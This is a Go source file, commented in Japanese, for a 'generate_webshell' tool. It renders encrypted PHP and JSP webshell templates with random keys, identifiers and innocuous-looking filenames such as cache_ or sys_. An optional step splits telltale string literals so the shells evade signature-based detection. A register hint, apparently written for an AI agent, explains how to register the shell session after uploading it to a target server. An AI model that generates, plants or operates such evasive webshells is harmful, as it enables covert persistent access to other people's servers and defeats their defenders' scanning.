// shellgen.go は暗号化シェルの生成器(generate_webshell ツールの実装): 内蔵テンプレート
// (shelltpl/*.tpl、Go embed)をレンダリングし、シェル本体ごとに 32B のセッション鍵(crypto/rand)をランダム生成し、
// すべての関数/変数名をランダム化し(静的シグネチャの最小化)、任意で PHP の軽度な構文変形を行う。
//
// 過適合の回避: テンプレートとプロトコルに特定の目標値は一切なく、鍵/ファイル名/識別子はすべて実行時ランダム。
package session

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"sort"
	"strings"
	"text/template"
)

//go:embed shelltpl/php_enc.php.tpl
var phpEncTemplate string

//go:embed shelltpl/jsp_enc.jsp.tpl
var jspEncTemplate string

// GeneratedShell は generate_webshell の成果物。KeyB64 は register_session の
// secret パラメータ、KeyDigest は監査の照合に使う(平文を DB に保存しない場面向け)。
type GeneratedShell struct {
	Lang      string `json:"lang"`       // phpenc | jspenc(register_session の lang パラメータ)
	Filename  string `json:"filename"`   // 推奨ファイル名(ランダム化、意味的特徴なし)
	Content   string `json:"content"`    // シェル本体の全文(テンプレートレンダリング後、監査可能)
	KeyB64    string `json:"key_b64"`    // セッション鍵(base64 32B、register_session の secret)
	KeyDigest string `json:"key_digest"` // sha256(鍵) の先頭 16 hex、監査の照合用
	Mode      string `json:"mode"`       // 暗号化モードの識別子(シェル本体に固定的に埋め込み)
	Note      string `json:"note,omitempty"`
	// RegisterHint はアップロード後にセッションを登録する正確な呼び出し例(モデルは key を
	// password フィールドに入れがちなので、そのまま真似できる呼び出し形を示す。password を secret の別名としても受け付ける)。
	RegisterHint string `json:"register_hint"`
}

// tplIdentNames は 2 つのテンプレートが使うすべての {{.Xxx}} プレースホルダ(KeyB64 を除く。別途処理)。
// 生成器は各プレースホルダにランダムな識別子を割り当てる。レンダリングは missingkey=error で、プレースホルダの漏れは即エラー。
var tplIdentNames = []string{
	// PHP テンプレート
	"VKey", "VMethods", "VMode", "VResp", "VPlain", "VJson", "VReq", "VOp",
	"VCode", "VT", "VData", "VFlag", "VR",
	"FDec", "FEnc", "FFrame", "FUnframe",
	// JSP テンプレート(同名プレースホルダは同じランダム名を再利用してよい。2 つのテンプレートは独立にレンダリングされる)
	"FK", "FG", "FBody", "VOut", "VErr", "VOk", "VRaw", "VP", "VB", "VI",
	"VBuf", "VN", "VF", "VFI", "VFO",
}

// shellNamePrefixes は推奨ファイル名のランダム接頭辞(汎用語のみで、目標の特徴は一切ない)。
var shellNamePrefixes = []string{"cache", "sys", "img", "db", "conf", "util", "lib", "api"}

// randIdent はランダムな識別子を生成する(英字始まり、9 文字)。
func randIdent() string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	const alnum = letters + "0123456789"
	var b [9]byte
	_, _ = rand.Read(b[:])
	var sb strings.Builder
	sb.WriteByte(letters[int(b[0])%len(letters)])
	for i := 1; i < len(b); i++ {
		sb.WriteByte(alnum[int(b[i])%len(alnum)])
	}
	return sb.String()
}

// randPick はリストから 1 項目をランダムに取り出す。
func randPick(items []string) string {
	var b [1]byte
	_, _ = rand.Read(b[:])
	return items[int(b[0])%len(items)]
}

// GenerateShell は暗号化シェルを 1 つ生成する。lang: php | jsp。obfuscate は PHP にのみ効く:
// レンダリング後のシェル本体に軽度の構文変形を施す(特徴の強い文字列リテラルの分割/連結)。
func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, error) {
	lang = strings.ToLower(strings.TrimSpace(lang))
	var tpl, mode string
	switch lang {
	case "php":
		tpl = phpEncTemplate
		mode = "auto:gcm|cbc" // GCM 優先。目標に GCM がなければシェル本体が実行時に CBC+HMAC へ降格
	case "jsp":
		tpl = jspEncTemplate
		mode = "gcm"
	default:
		return nil, opError("generate", "未対応のシェル本体言語 %q(対応は php/jsp)", lang)
	}
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, opError("generate", "鍵の生成に失敗しました: %v", err)
	}
	keyB64 := base64.StdEncoding.EncodeToString(key)

	// 各プレースホルダにランダムな識別子を 1 つずつ(集合で重複排除: 衝突すると意味の違う 2 つの変数が同名になるため、必ず排除する)。
	fields := map[string]string{"KeyB64": keyB64}
	used := map[string]bool{}
	for _, name := range tplIdentNames {
		if _, ok := fields[name]; ok {
			continue // 2 つのテンプレートが共有する同名プレースホルダは同じランダム名を再利用
		}
		id := randIdent()
		for used[id] {
			id = randIdent()
		}
		used[id] = true
		fields[name] = id
	}
	t, err := template.New("shell").Option("missingkey=error").Parse(tpl)
	if err != nil {
		return nil, opError("generate", "シェル本体テンプレートの解析に失敗しました: %v", err)
	}
	var buf bytes.Buffer
	if err := t.Execute(&buf, fields); err != nil {
		return nil, opError("generate", "シェル本体テンプレートのレンダリングに失敗しました: %v", err)
	}
	content := buf.String()
	if obfuscate && lang == "php" {
		content = obfuscatePHP(content, keyB64)
	}
	digest := sha256.Sum256(key)
	var fnb [3]byte
	_, _ = rand.Read(fnb[:])
	ext := lang
	filename := fmt.Sprintf("%s_%s.%s", randPick(shellNamePrefixes), hex.EncodeToString(fnb[:]), ext)
	return &GeneratedShell{
		Lang:      lang + "enc",
		Filename:  filename,
		Content:   content,
		KeyB64:    keyB64,
		KeyDigest: hex.EncodeToString(digest[:])[:16],
		Mode:      mode,
		Note:      note,
		RegisterHint: fmt.Sprintf(
			`アップロード後に呼び出し: register_session({"url":"http://<目標>/<アップロードパス>/%s","lang":"%s","secret":"%s"})`,
			filename, lang+"enc", keyB64),
	}, nil
}

// obfuscatePHP はレンダリング後の PHP シェル本体に軽度の構文変形を施す: 高エントロピー/高特徴の文字列リテラル
// (鍵、アルゴリズム名、ドメイン区切り文字列、入力元)を複数の単一引用符リテラルの連結に分割する。
//
// 方針(コメントは約束): 分割/連結という「等価な書き換え」だけを行い、eval(base64(...))、
// gzinflate の入れ子などの高特徴形態は行わない。それはシグネチャライブラリの第一の命中点で、変形の利得が負になる。軽度の変形が
// 消すのは「文字列全体の定数」という特徴で、同時にシェル本体の可読性と監査可能性は保つ。
func obfuscatePHP(src, keyB64 string) string {
	literals := []string{keyB64, "aes-256-gcm", "aes-256-cbc", "artex-enc-v1", "artex-mac-v1", "php://input"}
	// 長いリテラルを優先し、短い文字列が長い文字列の部分列とたまたま一致して二重分割されるのを防ぐ。
	sort.Slice(literals, func(i, j int) bool { return len(literals[i]) > len(literals[j]) })
	for _, lit := range literals {
		src = strings.ReplaceAll(src, "'"+lit+"'", phpConcatLit(lit))
	}
	return src
}

// phpConcatLit は文字列を 2〜4 個の単一引用符リテラルの連結に分割する(PHP のコンパイル時定数畳み込みにより意味は不変)。
func phpConcatLit(s string) string {
	if len(s) < 6 {
		return "'" + s + "'"
	}
	var b [1]byte
	_, _ = rand.Read(b[:])
	parts := 2 + int(b[0])%3 // 2〜4 個
	cuts := map[int]bool{}
	for len(cuts) < parts-1 {
		var c [1]byte
		_, _ = rand.Read(c[:])
		cuts[1+int(c[0])%(len(s)-1)] = true
	}
	var points []int
	for p := range cuts {
		points = append(points, p)
	}
	sort.Ints(points)
	var segs []string
	prev := 0
	for _, p := range points {
		segs = append(segs, "'"+s[prev:p]+"'")
		prev = p
	}
	segs = append(segs, "'"+s[prev:]+"'")
	return strings.Join(segs, ".")
}
